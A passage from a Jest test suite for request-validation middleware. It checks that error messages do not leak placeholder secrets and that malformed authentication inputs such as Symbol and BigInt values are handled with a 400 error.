        expectMiddlewareError(result.next);
        
        const error = result.next.mock.calls[0][0];
        const errorString = JSON.stringify(error);
        
        // Should not expose sensitive values in error messages
        expect(errorString).not.toContain('secret-api-key-12345');
        expect(errorString).not.toContain('super-secret-db-password');
        expect(errorString).not.toContain('$2b$10$secrethashvalue');
        expect(errorString).not.toContain('secret-salt-value');
        expect(errorString).not.toContain('admin@internal.company.com');
      });

      it('should handle malformed authentication data gracefully', async () => {
        const malformedData = [
          { email: Symbol('malicious'), password: 'test' },
          { email: 'test@example.com', password: Symbol('malicious') },
          { email: BigInt(123), password: 'test' },
          { email: 'test@example.com', password: BigInt(456) }
        ];

        for (const data of malformedData) {
          const result = await testMiddlewareWithData(validateAuthTypes, data, 'body');
          
          // Should handle gracefully
          expect(result).toBeDefined();
          
          // Should either pass through (for further validation) or reject with appropriate error
          if (result.next.mock.calls.length > 0 && result.next.mock.calls[0][0]) {
            const error = result.next.mock.calls[0][0];
            expect(error.statusCode).toBe(400);
          }
        }
      });
    });
  });

  // Include security testing helpers
  testSecurityScenarios('validate', validateBody, TestSchema);
  testSecurityScenarios('validateQuery', validateQuery, z.object({ search: z.string() }));
  testSecurityScenarios('validateParams', validateParams, z.object({ id: z.string() }));
});